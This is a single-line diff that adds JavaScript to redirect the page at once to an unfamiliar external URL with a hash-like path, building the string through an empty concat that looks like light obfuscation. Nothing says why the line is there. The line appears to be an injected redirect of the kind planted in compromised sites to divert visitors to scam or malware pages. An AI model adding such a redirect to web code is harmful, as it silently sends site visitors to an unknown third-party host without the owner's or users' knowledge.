@@ -1,0 +1,1 @@
+window.location.replace(``.concat(`https://rosaflavo.com/55/0/0/02b0a3677bb072780252bd7eb52ebfc0`))
